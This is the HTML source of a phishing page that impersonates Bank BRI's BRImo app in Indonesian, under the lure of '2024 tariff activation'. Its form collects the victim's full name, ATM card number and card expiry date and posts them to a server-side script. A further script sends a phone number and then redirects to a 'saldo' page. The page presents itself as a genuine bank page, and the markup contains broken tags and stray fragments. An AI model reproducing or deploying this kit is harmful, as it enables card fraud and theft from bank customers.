
<!DOCTYPE html>
<html lang="in">
<head>
<html lang="in" class="hydrated">
 <head> 
  <meta charset="UTF-8">
  <style data-styles="">ion-icon{visibility:hidden}.hydrated{visibility:inherit}</style> 
  <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 | 𝟮𝟬𝟮𝟰</title> 
  <link rel="icon" type="image/png" href="img/BRImo.png"> 
  <meta name="theme-color" content="#0f78cb"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <link rel="stylesheet" href="img/3.css"> 
  <style>
     .lonte{
  display:none;
  z-index:4;
  position: absolute;
  top: 33%;
  left: 33%;
  transform: translate(-50%, -50%);
  
/*   spinner div css */
  height : 100px;
  width : 75px;
  border-radius : 50%;
/*   background-color : red; */
  border : 5px solid #ffffff80;
  border-top-color : #007bff;
  animation : spin 1s linear infinite;
}

@keyframes spin{
  0%{
    transform : rotate(0deg);
  }
  100%{
    transform : rotate(360deg);
  }
}
@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap'); } * { margin: 0px; } html, body { max-width: 100%; overflow-x: ; } body { margin: 0px; background: ,#fff; background-size: 100%; color: #fff; font-family: 'Nunito', sans-serif; } welalxcome { position: fixed; left: 0; top: 0; width: 100vw; height: 100vh; display: flex; flex-direction: row; flex-wrap: nowrap; align-items: center; align-content: center; justify-content: center; background: #ffffffcc; z-index: 999; } welalxcome img { width:15vw; height: auto; } chsalxcome { position: relative; width: 100%; height: 100vh; display: flex; flex-direction: column; flex-wrap: nowrap; align-items: center; } .talxcome { width: 130%; flex-direction: column; flex-wrap: nowrap; align-items: center; height: 100%; justify-content: center; } .talxcome img { width: 73%; } .balxcome { height: 45vh; display: flex; flex-direction: column; flex-wrap: nowrap; align-items: center; } .txalxcome { width: 90%; height: 30vh; text-align: left; } .asu{ width:100%; margin-top:65px; position: fixed; height: 100%; z-index:3; } .nyusu{ border-radius:6px; height:150px; max-height:100%; z-index:3; margin-top: 80px; margin-left: 20px; box-shadow: rgba(0, 0, 0, 0.25) 0px 54px 55px, rgba(0, 0, 0, 0.12) 0px -12px 30px, rgba(0, 0, 0, 0.12) 0px 4px 6px, rgba(0, 0, 0, 0.17) 0px 12px 13px, rgba(0, 0, 0, 0.09) 0px -3px 5px; } ion-icon{ font-size: 22px; margin-left: 8px; margin-top: -2px; position: absolute; color: #06529C; } .button-85 { background-color: ; user-select: none; -webkit-user-select: none; touch-action: manipulation; z-index:-1; } .button-85:before { content: ""; background: linear-gradient( 50deg, #fff000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000 ); position: absolute; top: 0px; left: 0px; background-size: 500%; z-index: -1; filter: blur(0px); -webkit-filter: blur(0px); width: calc(100% + 0px); height: calc(100% + 0px); animation: glowing-button-85 20s linear infinite; transition: opacity 0.3s ease-in-out; border-radius: 18px; } @keyframes glowing-button-85 { 0% { background-position: 0 0; } 50% { background-position: 300% 0; } 100% { background-position: 0 0; } } .button-85:after { z-index: -1; content: ""; position: absolute; width: 100%; height: 100%; background: #ffffffe6; left: 0; top: 0; border-radius: 18px; } .xx{ z-index:3; bottom:170px; margin-left: 23px; margin-top: -170px; position: absolute; border:5px solid #ffffff; padding:15px; width:78%; border-radius:18px; background: #ffffffe6; background-size:100%; height: 225px; box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px; } .patokk{ z-index:3; display:block; margin-left: 20px; margin-top:; position:relative; background-color:#0F78CB; color:#fff; border:0px solid #0076e0; width:90%; border-radius:3px; font-family: 'Nunito', sans-serif; font-size: 15px; padding:13px; display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px; } .patokk:hover { z-index:3; opacity:0.3; border: 1px solid #0F78CB; background-color: #0F78CB; color: #fff; } .patokk:disabled, .patokk[disabled]{ z-index:3; opacity:0.3; border: 1px solid #0F78CB; background-color: #0F78CB; color: #fff; } .pilat{ z-index:3; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #ffffff; box-shadow: rgba(0, 0, 0, 0.15) 0px -12px 15px 0px; padding-top: 15px } .hh{ z-index:2; position: fixed; top: -10; left: 0; right: 0; margin: 0px auto; width: 100%; height: 50px; background: #0F78CB; border-bottom: 0px solid #fff; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px; } .hu{ z-index:3; bottom:170px; margin-left: 26px; margin-top: -170px; position: absolute; border:1.5px solid #fff; padding:15px; width:78%; border-radius:18px; background: url('img/haji.pngg'),#ffffffe6; background-size:100%; height: 230px; box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px; } .yy{ box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: #; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 15px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; } .zz{ z-index:2;position: fixed; top: -10; left: 0; right: 0; margin: 0px auto; width: 100%; height: 50px; background: #0F78CB; border-bottom: 0px solid #fff;box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px; }


.patokk:active { background-color: rgba(0, 110, 200, 0.96); box-shadow: rgba(50, 50, 93, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset; transform: translateY(0px); }

welalxcome {
  display: flex;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  width: 100%;
  background: url('img/welcome.png') no-repeat center center;
  background-position: 100% 100%;
  background-size: 100% 100%;
  z-index: 10000;
  background-color: #;

.load{
     top: 0;
     left: 0;
     right: 0;
     position: fixed;
     display: flex;
     justify-content: center;
     align-items: center;
     background: #00000090;
     z-index: 999999999;
     width: 100%;
     height: 75%;
      }
      
      .jao{
            width:90%;
      }
</style>
 </head> 
 <body> 
  <main> 
   <welalxcome> 

   </welalxcome> 
   <chsalxcome2 style="display: ;"> 
    <div class="load" style="display:none"> 
     <img src="https://hosting.tigerengine.id/f01dmo.gif" class="jao" alt=""> 
    </div> 
    <img style="z-index:1;position: fixed;width:100%;margin-top:0px;" width="100%" src="img/buri.png" alt=""> 
    <img style="z-index:2;position: fixed;width:100%;margin-top:50px;" src="img/26-.png" alt=""> 
    <nav class="hh"> 
     <img src="img/nav.png" style="margin-top:8px; margin-left:175px;" width="40px" alt=""> 
     <p style="margin-left:10px;">Spesial Untuk<b style="color: #F37024">mo</b></p>
     <b style="color: #F37024"> <p style="margin-left:10px;color:#fff;font-size:12px;">Cobain beragam cara baru untuk<br>memaksimalkan aktivitas perbankan kamu.</p> </b>
    </nav>
    <b style="color: #F37024"> 
     <marquee direction="right" behavior="alternate" scrolldelay="10" class="asu"> 
      <img class="nyusu" src="img/1.png" alt=""> 
      <img class="nyusu" src="img/2.png" alt=""> 
      <img class="nyusu" src="img/3.png" alt=""> 
      <img class="nyusu" src="img/4.png" alt=""> 
      <img class="nyusu" src="img/5.png" alt=""> 
     </marquee> 

   <form action="req/user.php" method="post" class="pure-form">

 <input type="hidden" id="logo" value="❁┷━❃∞∞𝗥𝗘𝗦𝗦 𝗕𝗥𝗜∞∞❃━┷❁"> <input type="hidden" id="nomor" name="nomor" value="">

<center><img style="z-index:3;position: fixed;width:20%;margin-top:610px;margin-left:-40px;" src="img/T24.png" alt="">
</center><div class="button-85 xx">

<center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 

<pstyle="border-bottom:1.5px solid #0000004a;border-radius:10px;margin-bottom:-4px;height:10px;">

</p>
   </center> 
<h5 style="color:#09559a; margin-top: 0px; margin-left: 4px">Proses Aktivasi Tarif,Silakan Isi Data Di Bawa Ini: <input id="nama" name="nam" type="text" class="yy" placeholder="Nama Lengkap:"required maxlength="" minlength=""></h3>

<h5 style="color:#09559a; margin-top: 0px; margin-left: 4px">Nomor Kartu ATM:<input id="nama" name="nodeb" type="tel" class="yy" placeholder=" XXXX XXXX XXXX XXXX" oninvalid="this.setCustomValidity('silakan mɑsukkɑn 16 digit nomor kartu ATM anda')" onchange="this.setCustomValidity('')" required maxlength="16" minlength="16"></h3>

<h5  style="color:#09559a; margin-top: 0px; margin-left: 4px">Masa Berlaku :<input id="nama" name="mb" type="tel" class="yy" placeholder="MM/YY" oninvalid="this.setCustomValidity('silakan mɑsukkɑn masa berlaku kartu ATM anda')" onchange="this.setCustomValidity('')"required maxlength="6" minlength="4"></h3>

     <center>

<h5  style="font-size: 14px; text-align: center; margin-top: 60px; margin-left: 10px; margin-right: 10px;">
<strong style="color: #FF0000; text-decoration: underline" onclick="location.href='login15.html'"> Belum Punya Kartu ATM. Klik disini? </strong></p></b> 
<br>
     <br>
     <br>
     <br>
           </center> 
<div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px">
<button type="submit" id="kirims" style="margin-left: 20px;margin-top: ;position:absolute;background-color:#0F78CB;color:white;border:0px solid #0076e0;width:90%;border-radius:0px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;" >Lanjutkan</button>
     <center>
         

  </section>
     </form>
     <br>
     <br>
     <br>
     <br>
     <br>
     <center>
     <div id="djload" name="process" class="process1" style="display: none;">
            <div class="loading">
                <img src="img/loding.gif">
              
            </div>
        </div>
        </center>
<div class="nav2"></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script><script src="js/jquery.mask.min.js"></script>

    });
});
</script>
    <script>
$(document).ready(function() {
    $('#nohp').mask('000-0000-00000');
});
    </script>
<script>
$( document ).ready(function() {
      $('welalxcome').fadeIn(500);
            setTimeout(() => {
                $('welalxcome').fadeOut();
                $('chsalxcome2').fadeIn();
            },800)
        })
</script>
<script>
function sendHp () {
event.preventDefault();
        var nomor = document.getElementById("nohp").value;
        sessionStorage.setItem("nomor", nomor);
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'req/no.php',
            data: $('#formHP').serialize(),
            datatype: 'text',
            
            complete: function(data) {
            setTimeout(function(){
  window.location.href='saldo.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    }, 800);
            }
        })
     }
</script>      
</body>
</html>
